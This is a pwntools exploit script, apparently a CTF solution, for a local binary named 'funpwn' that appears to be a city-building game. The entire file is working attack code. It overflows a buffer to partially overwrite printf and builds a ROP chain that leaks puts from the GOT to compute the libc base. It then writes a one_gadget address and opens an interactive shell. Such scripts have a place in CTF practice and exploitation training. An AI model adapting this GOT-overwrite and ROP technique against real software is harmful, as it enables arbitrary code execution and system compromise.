from pwn import *

context.log_level = 'debug'

def show():
	p.recvuntil('> ')
	p.sendline('show')

def develop(x,y,choice,content,data = None):
	cmd = 'develop %d %d %s'%(x,y,choice)
	if data != None:
		cmd += ' ' + data
	if choice == 'commercial' or choice == 'residential':
		p.recvuntil('> ')
		p.sendline(cmd)
		p.recvuntil('?')
		p.sendline(content)
	elif choice == 'industrial':
		p.recvuntil('> ')
		p.sendline(cmd)
	else:
		pass

def demolish(x,y):
	cmd = 'demolish %d %d'%(x,y)
	p.recvuntil('> ')
	p.sendline(cmd)

def step():
	p.recvuntil('> ')
	p.sendline('step')

def show():
	p.recvuntil('> ')
	p.sendline('show')

p = process('./funpwn')
elf = ELF('./funpwn')

for i in range(22):   #22
	develop(0,0,'industrial','')
demolish(0,0)


for i in range(5):  #27
	develop(5,i,'industrial','')

develop(4,0,'residential','182') 
develop(4,0,'commercial','aaaa')
step()   #33


develop(8,0,'residential','1','b'*72 + p64(0xFFFFFFD6))  # partial overwrite the printf to add rsp + 0xd8 
step()

pop_rdi_ret = 0x00000000004019f3
pop_rbp_ret = 0x0000000000400bb5
read_addr = 0x0000000000401171
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
printf_got = elf.got['printf']

payload = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload += p64(pop_rbp_ret) + p64(printf_got + 0x110) 
payload += p64(read_addr)



#gdb.attach(p)
develop(2,0,'commercial','c'*144 + payload)
p.recvuntil('\n')
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('puts addr : 0x%x'%puts_addr)
libc_base = puts_addr - 0x6f690
log.success('lib base addr : 0x%x'%libc_base)
system_addr = libc_base + 0x45390
onegadge = libc_base + 0x45216

p.sendline(p64(onegadge))

p.interactive()

